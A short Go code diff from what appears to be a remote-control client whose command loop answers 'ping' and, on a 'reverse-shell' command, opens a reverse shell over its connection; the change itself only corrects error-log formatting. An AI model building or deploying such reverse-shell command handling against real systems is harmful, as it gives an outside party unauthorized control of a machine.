@@ -37,13 +37,13 @@ func main() {
 		case "ping":
 			err = comms.SendStringTo(conn, "pong")
 			if err != nil {
-				log.Printf("pong failed: %e\n", err)
+				log.Printf("pong failed: %s\n", err.Error())
 			}
 
 		case "reverse-shell":
 			err = shell.StartReverseShell(conn)
 			if err != nil {
-				log.Printf("reverse-shell failed: %e\n", err)
+				log.Printf("reverse-shell failed: %s\n", err.Error())
 			}
 
 		}
